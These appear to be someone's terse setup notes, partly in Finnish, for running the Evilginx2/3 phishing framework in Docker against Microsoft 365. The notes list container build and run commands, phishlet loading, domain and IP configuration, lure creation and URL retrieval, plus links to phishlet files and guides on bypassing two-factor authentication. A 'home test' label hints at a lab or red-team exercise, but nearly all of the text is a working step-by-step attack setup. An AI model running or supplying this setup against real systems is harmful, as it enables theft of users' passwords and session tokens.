docker build -t apa/evilgnix2 .
https://github.com/vishnudxb/docker-evilginx2

https://github.com/froyo75/docker-evilginx2/tree/main

https://github.com/warhorse/docker-evilginx2

https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/o365.yaml

https://m0chan.github.io/2019/07/26/Bypassing-2FA-For-Fun-With-Evilginx2.html

https://github.com/CraftedCat/evilginx2-1

```docker
docker create --name=evilginx2 -e TZ=Europe/London -p 445:443 -p 85:80 -v ./config:/config -v ./phislets:/phishlets --restart unless-stopped apa/evilgnix2:latest

```



lataa phisletit `/app# evilginx -p phishlets/`



Kotitesti

huoleton-myyja@leikkikentta.net


docker exec -it evilginx2 /bin/bash
evilginx -p /app/phishlets/


config domain leikkikentta.fi
phishlets hostname m365 leikkikentta.fi
config ipv4 88.86.150.114
phishlets enable m365

lures create m365

lures get-url 0

Paras guide:
- https://janbakker.tech/how-to-set-up-evilginx-to-phish-office-365-credentials/
- https://github.com/BakkerJan/evilginx3/blob/main/microsoft365.yaml
- https://github.com/BakkerJan/evilginx3/blob/main/microsoft365-adfs.yaml
- https://janbakker.tech/evilginx-resources-for-microsoft-365/
- https://www.youtube.com/watch?v=1SqH4n4suX4

https://help.evilginx.com/docs/guides/blacklist

phishlets hostname microsoft365 leikkikentta.fi
phishlets enable microsoft365

lures create microsoft365

lures get-url 1


villain@gonephishing



sudo service systemd-resolved stop
sudo nano /etc/resolv.conf
sudo evilginx